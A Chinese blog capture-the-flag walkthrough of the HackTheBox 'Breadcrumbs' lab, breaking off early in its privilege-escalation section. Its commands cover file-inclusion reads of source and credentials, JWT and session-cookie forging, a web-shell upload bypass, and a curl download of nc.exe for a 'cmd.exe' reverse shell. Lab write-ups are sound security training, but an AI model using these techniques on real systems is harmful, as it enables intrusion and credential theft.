@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Breadcrumbs - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Breadcrumbs靶场信息  靶场类型  信息搜集Nmap使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.228  ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV 10.10.10.228 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Breadcrumbs - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Breadcrumbs靶场信息  靶场类型  信息搜集Nmap使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.228  ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV 10.10.10.228 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/52c6e1e5-c429-4907-bb22-2e74f3543e76.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/fe9be17b-7d8c-46ec-9094-d13ffef02788.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/0c44ebc9-2d5a-4e9c-826d-8d157e58289c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/91ed5a94-ca42-4ba8-9b0f-79b561b540cf.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/1db3f872-a271-4883-88fc-698438ba9e7f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/3b5ef4b7-fe1b-4869-9e7f-265995871b6f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/ad7b8f75-0e74-4598-aec3-f068f1e3b7f6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/41d28654-7825-451b-ad8a-4a7246297a72.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d80ea596-7693-40b9-972a-292d73beaad2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/10a5ca60-30ff-44da-9965-be1aa9d17a5e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d0dc533d-0bbe-4544-8794-45564041fb64.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/2b3097a9-cef7-4b5c-a3cd-9f82bc00acbf.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d5afa7bf-eb09-4436-af09-02861f771fe2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/43d19e87-34aa-4c2e-a1ce-39bcaa158388.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/a4170031-69e7-4bfd-a1e1-d73231400c84.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/44803c4c-843f-43ba-a03a-1b7538ab9cea.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/1d036af7-380f-415e-a33b-fafc464698ac.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/a91f8d84-1038-4fd1-b7a4-642a483a8180.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/5d1e5788-3ae4-4edf-8596-9bc5a84b3eee.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/1c27ba84-3462-495e-9ce4-3867f9f4ac53.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/35ce4295-a80f-44d4-80c4-864ad0172bfa.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/a31640c3-37a8-4034-96f4-09e82c28a072.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/ff713ca2-8b56-4f81-a701-d529027a2219.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/fd0780be-9f1a-4f5b-be25-9a4431f2d1e8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/7abb2910-c2e7-45bf-b3cc-7f8fd1c28113.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/68b774bf-97a6-4448-bab6-34b94f75d3fd.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/2606c3a6-0297-46e8-98a3-3cb4fba09389.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/06357381-0eaa-41fe-8895-383c003acab2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/cd414f8b-3e49-4881-af68-6b260168a15c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/3581de3d-b044-4746-8c53-73d5e1281246.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d895b412-e2e4-4dc1-b88c-43eace3df37b.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/377d42bf-dcc5-4f83-9393-0d2875648319.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/7f8b6af4-c154-4bf2-99a3-a781a3973a0f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/396206c5-a50b-4645-b5d4-d7194941a1fc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/9b416034-80f1-4f68-95ac-13f9e7de4434.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/8430ab0c-c686-43ef-b095-587aa0730a73.png">
+<meta property="article:published_time" content="2021-06-19T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:41:54.096Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/52c6e1e5-c429-4907-bb22-2e74f3543e76.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Breadcrumbs - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Breadcrumbs - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-06-19T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-06-19
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Breadcrumbs"><span class="post-toc-text">Hackthebox - Breadcrumbs</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#方法一："><span class="post-toc-text">方法一：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#方法二："><span class="post-toc-text">方法二：</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Breadcrumbs"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Breadcrumbs - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-06-19 19:38:36" datetime="2021-06-19T11:38:36.000Z"  itemprop="datePublished">2021-06-19</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Breadcrumbs"><a href="#Hackthebox-Breadcrumbs" class="headerlink" title="Hackthebox - Breadcrumbs"></a>Hackthebox - Breadcrumbs</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a><strong>靶场信息</strong></h1><img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/52c6e1e5-c429-4907-bb22-2e74f3543e76.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a><strong>靶场类型</strong></h1><img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/fe9be17b-7d8c-46ec-9094-d13ffef02788.png" class>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>使用nmap进行端口扫描</p>
+<pre><code class="cpp">nmap -A -sS -sC -sV 10.10.10.228
+</code></pre>
+<pre><code class="cpp">┌──(root💀root)-[~/Desktop]
+└─# nmap -A -sS -sC -sV 10.10.10.228
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-19 13:47 CST
+Nmap scan report for 10.10.10.228
+Host is up (0.25s latency).
+Not shown: 993 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey:
+| 2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
+| 256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
+|_ 256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
+80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+| http-cookie-flags:
+| /:
+| PHPSESSID:
+|_ httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
+|_http-title: Library
+135/tcp open msrpc Microsoft Windows RPC
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+| http-cookie-flags:
+| /:
+| PHPSESSID:
+|_ httponly flag not set
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
+|_http-title: Library
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after: 2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_ http/1.1
+445/tcp open microsoft-ds?
+3306/tcp open mysql?
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=6/19%OT=22%CT=1%CU=39016%PV=Y%DS=2%DC=T%G=Y%TM=60CD853
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=
+OS:U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW8NNS
+OS:%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%
+OS:DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
+OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
+OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
+OS:Z)
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: 11m52s
+| smb2-security-mode:
+| 2.02:
+|_ Message signing enabled but not required
+| smb2-time:
+| date: 2021-06-19T06:00:15
+|_ start_date: N/A
+TRACEROUTE (using port 53/tcp)
+HOP RTT ADDRESS
+1 248.74 ms 10.10.14.1
+2 248.83 ms 10.10.10.228
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 59.03 seconds
+</code></pre>
+<p>可以看到，该靶机开启了22、80、135、139、443、445、3306端口</p>
+<p>咱们访问一下80端口</p>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/0c44ebc9-2d5a-4e9c-826d-8d157e58289c.png" class>
+
+<p>点击check books看看</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/91ed5a94-ca42-4ba8-9b0f-79b561b540cf.png" class>
+
+<p>查找图书，咱们随便查找一个</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/1db3f872-a271-4883-88fc-698438ba9e7f.png" class>
+
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/3b5ef4b7-fe1b-4869-9e7f-265995871b6f.png" class>
+
+<p>咱们拦截一个包看看</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/ad7b8f75-0e74-4598-aec3-f068f1e3b7f6.png" class>
+
+<p>看到有个参数book，是读取网页的，那是否存在LFI（本地文件包含）呢？测试一下</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/41d28654-7825-451b-ad8a-4a7246297a72.png" class>
+
+<p>我们可以看到，提示的是没有这个文件，也就是说，确实存在LFI</p>
+<p>只不过咱们要访问的页面在上级目录里而已，咱们测试一下</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d80ea596-7693-40b9-972a-292d73beaad2.png" class>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p>nice，该漏洞确实是存在的，并且可以利用</p>
+<p>由于这是一台windows的机器，咱们查看一下他自身存在的一些文件</p>
+<pre><code class="cpp">../../../../../../WINDOWS/system32/drivers/etc/hosts
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/10a5ca60-30ff-44da-9965-be1aa9d17a5e.png" class>
+
+<pre><code class="cpp">&quot;# Copyright (c) 1993-2009 Microsoft Corp.\r\n#\r\n# This is a sample HOSTS file used by Microsoft TCP\/IP for Windows.\r\n#\r\n# This file contains the mappings of IP addresses to host names. Each\r\n# entry should be kept on an individual line. The IP address should\r\n# be placed in the first column followed by the corresponding host name.\r\n# The IP address and the host name should be separated by at least one\r\n# space.\r\n#\r\n# Additionally, comments (such as these) may be inserted on individual\r\n# lines or following the machine name denoted by a &#39;#&#39; symbol.\r\n#\r\n# For example:\r\n#\r\n# 102.54.94.97 rhino.acme.com # source server\r\n# 38.25.63.10 x.acme.com # x client host\r\n\r\n# localhost name resolution is handled within DNS itself.\r\n#\t127.0.0.1 localhost\r\n#\t::1 localhost\r\n&quot;
+</code></pre>
+<p>我们之前从错误中看到了关于bookController.php所以让我们尝试读取文件</p>
+<pre><code class="cpp">../../../../../../Users/www-data/Desktop/xampp/htdocs/includes/bookController.php
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d0dc533d-0bbe-4544-8794-45564041fb64.png" class>
+
+<pre><code class="cpp">&quot;&lt;?php\r\n\r\nif($_SERVER[&#39;REQUEST_METHOD&#39;] == \&quot;POST\&quot;){\r\n $out = \&quot;\&quot;;\r\n require &#39;..\/db\/db.php&#39;;\r\n\r\n $title = \&quot;\&quot;;\r\n $author = \&quot;\&quot;;\r\n\r\n if($_POST[&#39;method&#39;] == 0){\r\n if($_POST[&#39;title&#39;] != \&quot;\&quot;){\r\n $title = \&quot;%\&quot;.$_POST[&#39;title&#39;].\&quot;%\&quot;;\r\n }\r\n if($_POST[&#39;author&#39;] != \&quot;\&quot;){\r\n $author = \&quot;%\&quot;.$_POST[&#39;author&#39;].\&quot;%\&quot;;\r\n }\r\n \r\n \r\n $query = \&quot;SELECT * FROM books WHERE title LIKE ? OR author LIKE ?\&quot;;\r\n $stmt = $con-&gt;prepare($query);\r\n $stmt-&gt;bind_param(&#39;ss&#39;, $title, $author);\r\n $stmt-&gt;execute();\r\n $res = $stmt-&gt;get_result();\r\n $out = mysqli_fetch_all($res,MYSQLI_ASSOC);\r\n }\r\n\r\n elseif($_POST[&#39;method&#39;] == 1){\r\n $out = file_get_contents(&#39;..\/books\/&#39;.$_POST[&#39;book&#39;]);\r\n }\r\n\r\n else{\r\n $out = false;\r\n }\r\n\r\n echo json_encode($out);\r\n}&quot;
+</code></pre>
+<p>这时候线索又指向了$out &#x3D; “”;\r\n require ‘..&#x2F;db&#x2F;db.php</p>
+<p>咱们去查看一下db.php文件</p>
+<pre><code class="cpp">../../../../../../Users/www-data/Desktop/xampp/htdocs/db/db.php
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/2b3097a9-cef7-4b5c-a3cd-9f82bc00acbf.png" class>
+
+<pre><code class="cpp">&quot;&lt;?php\r\n\r\n$host=\&quot;localhost\&quot;;\r\n$port=3306;\r\n$user=\&quot;bread\&quot;;\r\n$password=\&quot;jUli901\&quot;;\r\n$dbname=\&quot;bread\&quot;;\r\n\r\n$con = new mysqli($host, $user, $password, $dbname, $port) or die (&#39;Could not connect to the database server&#39; . mysqli_connect_error());\r\n?&gt;\r\n&quot;
+</code></pre>
+<p>成功得到了3306端口的账号密码</p>
+<pre><code class="cpp">username = bread
+password = jUli901
+</code></pre>
+<p>咱们尝试登录到mysql</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/d5afa7bf-eb09-4436-af09-02861f771fe2.png" class>
+
+<p>提示失败</p>
+<p>咱们换个思路，读取他的login页面，审计一下登录逻辑</p>
+<pre><code class="cpp">../portal/login.php
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/43d19e87-34aa-4c2e-a1ce-39bcaa158388.png" class>
+
+<p>咱们给他复制出来审计一下</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/a4170031-69e7-4bfd-a1e1-d73231400c84.png" class>
+
+<p>咱们发现它正在使用authController.php文件，咱们继续追踪过去看看</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/44803c4c-843f-43ba-a03a-1b7538ab9cea.png" class>
+
+<p>咱们看到它有使用一段key，咱们复制出来看看</p>
+<pre><code class="cpp">$secret_key = &#39;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#39;
+</code></pre>
+<p>咱们还能看到，它有使用一个JWT令牌，这个之前咱们用到过的</p>
+<p>同时还调用了一个cookie.php页面，咱们继续追踪看看</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/1d036af7-380f-415e-a33b-fafc464698ac.png" class>
+
+<pre><code class="cpp">&quot;&lt;?php\r\n\/**\r\n * @param string $username Username requesting session cookie\r\n * \r\n * @return string $session_cookie Returns the generated cookie\r\n * \r\n * @devteam\r\n * Please DO NOT use default PHPSESSID; our security team says they are predictable.\r\n * CHANGE SECOND PART OF MD5 KEY EVERY WEEK\r\n * *\/\r\nfunction makesession($username){\r\n $max = strlen($username) - 1;\r\n $seed = rand(0, $max);\r\n $key = \&quot;s4lTy_stR1nG_\&quot;.$username[$seed].\&quot;(!528.\/9890\&quot;;\r\n $session_cookie = $username.md5($key);\r\n\r\n return $session_cookie;\r\n}&quot;
+</code></pre>
+<p>暂时到这线索就断了，咱们去看看portal目录下还有啥吧</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/a91f8d84-1038-4fd1-b7a4-642a483a8180.png" class>
+
+<p>该目录下有一个files.php文件，咱们查看一下</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/5d1e5788-3ae4-4edf-8596-9bc5a84b3eee.png" class>
+
+<p>不出意外的话，files的用户应该是paul了</p>
+<p>去JWT.io创建一个令牌</p>
+<pre><code class="cpp">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
+</code></pre>
+<p>咱们去登录</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/1c27ba84-3462-495e-9ce4-3867f9f4ac53.png" class>
+
+<p>随便注册一个账号，然后登录，然后替换JWT令牌</p>
+<pre><code class="cpp">&lt;?php
+$username = &quot;paul&quot;;
+$max = strlen($username) -1;
+$seed = rand(0, $max);
+$key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528./9890&quot;;
+$session_cookie = $username.md5($key);
+echo $session_cookie;
+?&gt;
+</code></pre>
+<p>使用该脚本获取session进行替换</p>
+<pre><code class="cpp">for i in {0..5};do php session.php;echo &#39;&#39;;sleep 1;done
+</code></pre>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/35ce4295-a80f-44d4-80c4-864ad0172bfa.png" class>
+
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/a31640c3-37a8-4034-96f4-09e82c28a072.png" class>
+
+<p>成功登录为paul账户</p>
+<p>File management似乎只允许.zip格式的文件</p>
+<p>咱们上传一个phpshell</p>
+<blockquote>
+<p><a href="https://github.com/LucifielHack/p0wny-shell" target="_blank" rel="noopener">https://github.com/LucifielHack/p0wny-shell</a></p>
+</blockquote>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/ff713ca2-8b56-4f81-a701-d529027a2219.png" class>
+
+<p>上传的时候 会自动在末尾添加上.zip</p>
+<p>咱们在最末尾再手动添加一个.php即可绕过</p>
+<p>这只是个前端验证</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/fd0780be-9f1a-4f5b-be25-9a4431f2d1e8.png" class>
+
+<p>成功拿到一个phpshell</p>
+<p>此处有两个方法得到一个shell</p>
+<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>查看C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData目录下的juliette.json文件，即可得到一个账号密码，进行SSH登录</p>
+<pre><code class="cpp">type juliette.json
+
+username = juliette
+password = jUli901./())!
+</code></pre>
+<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>本地使用python3搭建一个http服务器，在phpshell内使用curl进行下载nc.exe，然后使用nc进行shell反弹</p>
+<p>本机运行</p>
+<pre><code class="cpp">python3 -m http.server 80
+nc -nvlp 4444
+phpshell运行
+curl [http://localhost/nc.exe -o nc.exe](http://localhost/nc.exe%20-o%20nc.exe)
+nc.exe localhost 4444 -e cmd.exe
+</code></pre>
+<p>这里看大家自己喜欢什么方式了</p>
+<img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/7abb2910-c2e7-45bf-b3cc-7f8fd1c28113.png" class>
+
+<p>成功获得users权限的flag</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a><strong>权限提升</strong></h1><img src="/2021/06/19/Hackthebox/Hackthebox-Breadcrumbs/68b774bf-97a6-4448-bab6-34b94f75d3fd.png" class>
+
+<p>咱们查看一下桌面上todo.html的内容</p>
+<p>它声明它将密码存储在名为 Microsoft Store Sticky Notes 的程序中</p>
+<p>咱们找过去</p>
+<p>参考链接</p>
+<blockquote>
